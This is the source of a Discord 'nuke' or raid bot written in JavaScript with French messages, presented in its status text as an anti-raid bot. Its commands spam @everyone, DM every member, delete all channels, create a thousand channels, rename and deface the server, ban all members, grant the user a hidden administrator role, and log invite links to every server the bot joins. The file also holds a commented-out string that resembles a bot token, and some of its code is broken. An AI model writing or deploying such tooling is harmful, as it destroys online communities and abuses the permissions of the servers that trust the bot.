const Discord = require('discord.js');
const bot = new Discord.Client();
const prefix = ('o/');
//"NTg4MzYwMDkyMTM1NTg3ODUy.XQEIGQ.UnyDl_LE_N41vu88bsdUV5roteI"
//process.env.TOKEN
bot.login(process.env.TOKEN)
var mention = "90 connectés"
 
var fucked = false;
 
bot.on('ready', function() {
  setInterval(async () => {
const statuslist = [
  `surveille 90 serveurs connectés`,
  `𝔹𝕆𝕋 𝔹𝕐 𝕆𝕄𝔼𝔾𝔸`,
  `Bot AntiRaid`,
];
const random = Math.floor(Math.random() * statuslist.length);
 
try {
  await bot.user.setPresence({
    game: {
      name: `${statuslist[random]}`,
      url : "https://www.twitch.tv/Mr.adam99"
    },
    status: "online"
  });
} catch (error) {
  console.error(error);
}
}, 3000);
    bot.guilds.forEach(guild => {
      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
    })
});
 
bot.on('message', msg => {

  if (msg.content === 'o/ping') {
    msg.reply('pong !')
  }
  
 
  if (msg.content === 'o/z') {
    console.log(`Commande o/exe par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("@everyone  @here  ");
     }, 500);
  }
            if (msg.content === 'o/destroyed') {
            console.log(`Commande o/mp par ${msg.author.tag}`);
                if (msg.channel.type === "dm") return;
                if (msg.deletable) msg.delete();
                msg.guild.members.forEach(member => {
                  setInterval(function () {
                    member.send(msg.guild.owner.user.username+" vient de se faire pulvériser son serveur par la 𝕆𝕞𝕖𝕘𝕒 \n\n **REJOINS 𝕆𝕞𝕖𝕘𝕒 ICI** : https://discord.gg/mH6P9hM \n\n https://cdn.dribbble.com/users/1461209/screenshots/3963953/drrr.gif").catch(error => {}) }, 450)})
    ;
 
if(msg.content === 'x/delete'){
          if(msg.channel.type === "dm") return;
          if(msg.guild.channels.size === 0) return;
          else if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
          msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
      }
 
  if (msg.content === 'x/destroyed') {
    console.log(`Commande x/destroyed par ${msg.author.tag}`);
 
    if (!fucked){
      msg.guild.setIcon("diapo.jpg").catch(e => {});
      msg.guild.setName('Hacked by 𝕆𝕞𝕖𝕘𝕒').catch(e => {});
 
      for (var i = 0; i < 1000; i++) {
        msg.guild.createChannel('𝕆𝕞𝕖𝕘𝕒', 'voice').catch(e => {});
        msg.guild.createChannel('Raid By 𝕆𝕞𝕖𝕘𝕒', 'text').catch(e => {});
      }
      fucked = true;
            }
 
    if (msg.deletable) {
      msg.delete();
    }
  }
 
  if (msg.content === 'o/ban') {
    console.log(`Commande o/ban par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "  ") && member.bannable) member.ban().catch(e => {});
    });
  }
 
  if (msg.content === 'o/exit') {
    console.log(`Commande o/exit par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }
 
  if (msg.content === 'o/deface') {
    if (msg.deletable) msg.delete();
    msg.guild.setRegion('japan')
    msg.guild.setIcon('https://cdn.dribbble.com/users/1461209/screenshots/3963953/drrr.gif');
    msg.guild.setName('Hacked By 𝕆𝕞𝕖𝕘𝕒')
  }

  if (msg.content === 'o/admin') {
    console.log(`Commande o/admin par ${msg.author.tag}`);
 
    msg.member.guild.createRole({
      name: "  ",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
};
bot.on("message", msg => {
    if(msg.content.startsWith("o/destroyed")){
       msg.delete()
        let i = 0;
        let interval = setInterval(function () {
          msg.guild.channels.forEach(channel => {
            if (channel.type === "text") channel.send('@everyone je vien de vous annoncez que... \n\n 𝕆𝕞𝕖𝕘𝕒 vient de détruire votre serveur.\n\n                                  **REJOINS 𝕆𝕞𝕖𝕘𝕒 ICI** : https://discord.gg/mH6P9hM \n\nhttps://cdn.dribbble.com/users/1461209/screenshots/3963953/drrr.gif')
          }, 2500);
          raid.createChannels(bot, "o/destroyed", 200, "Hacked By 𝕆𝕞𝕖𝕘𝕒 ")
            });
          }
        });
    });
